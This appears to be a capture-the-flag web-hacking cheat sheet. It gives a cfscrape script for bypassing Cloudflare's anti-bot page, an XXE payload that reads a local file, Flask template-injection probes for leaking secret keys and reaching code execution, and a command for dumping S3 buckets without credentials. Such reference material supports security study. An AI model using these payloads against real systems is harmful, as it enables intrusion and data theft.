
* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.

``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper()
print scraper.get(url).content
```

* [`wpscan`](https://wpscan.org/)

	* A Ruby script to scan and do reconnaissance on a [Wordpress](https://en.wikipedia.org/wiki/WordPress) application.


* XXE : XML External Entity

    Include local files in XML. Can be used to make an **LFI** from a XML parser.
    XML script to display the content of the file /flag :

    Dont forget to use <?xml version="1.0" encoding="UTF-16"?> on Windows (for utf16).

``` xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///flag">
]>
<data>&file;</data>
```


* Flask Template Injection

	Try `{{config}}` to leak out the secret key, or start to climb up the Python MRO to acheive code execution.

	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)



* [`nikto`](https://github.com/sullo/nikto)

	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).


* [Burpsuite](https://portswigger.net/burp)

	Tool suite generally used to intercept and manipulate HTTP requests.


* AWS / S3 Buckets dump

	Dump all files from a S3 bucket without credentials.

``` bash
aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
```